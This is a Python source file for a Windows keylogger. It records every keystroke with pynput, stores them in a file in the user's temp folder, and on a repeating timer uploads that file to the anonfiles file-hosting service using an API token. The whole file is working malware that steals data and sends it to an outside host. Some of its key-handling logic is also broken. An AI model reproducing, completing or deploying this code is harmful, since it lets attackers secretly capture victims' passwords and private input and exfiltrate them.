# -*- coding: utf-8 -*-
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================
from pynput import keyboard 
import requests
import threading
from requests import post
from os import getenv , environ , path , chdir , remove
class I_see_u:
    def __init__(self,token,time_interval):
        self.token = token
        self.time_interval = time_interval*60
        self.text = ""
        self.paths = path.join(environ["USERPROFILE"],"AppData","Local","temp")
        chdir(self.paths)
    def send_mega_req(self):
        filename = getenv("Computername")+".txt"
        try:
            timer = threading.Timer(self.time_interval, self.send_mega_req)
            timer.start()
            with open(f"{filename}",mode='a' , encoding='utf-8') as file_txt:
                file_txt.write(self.text)
            files = {'file': (f'{filename}', open(f"{filename}", 'rb'))}
            url = f'https://api.anonfiles.com/upload?token={self.token}'
            post(url, files=files)
            self.text = ""    
        except Exception as e:
            print(e)
    def on_press(self,key):
        global text

        if key == keyboard.Key.enter:
            self.text += "\n"
        elif key == keyboard.Key.tab:
            self.text += "\t"
        elif key == keyboard.Key.space:
            self.text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.shift and "2":
            self.text += "@"
        elif key == keyboard.Key.shift and "3":
            self.text += "#"
        elif key == keyboard.Key.shift and "4":
            self.text += "$"
        elif key == keyboard.Key.shift and "5":
            self.text += "%"
        elif key == keyboard.Key.shift and "6":
            self.text += "^"
        elif key == keyboard.Key.shift and "7":
            self.text += "&"
        elif key == keyboard.Key.shift and "8":
            self.text += "*"
        elif key == keyboard.Key.shift and "9":
            self.text += "("
        elif key == keyboard.Key.shift and "10":
            self.text += ")"
        elif key == keyboard.Key.shift and "/":
            self.text += "?"
        elif key == keyboard.Key.backspace and len(self.text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(self.text) > 0:
            self.text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            self.text += str(key).strip("'")

    def Run(self):
        with keyboard.Listener(
            on_press=self.on_press) as listener:
            self.send_mega_req()
            listener.join()
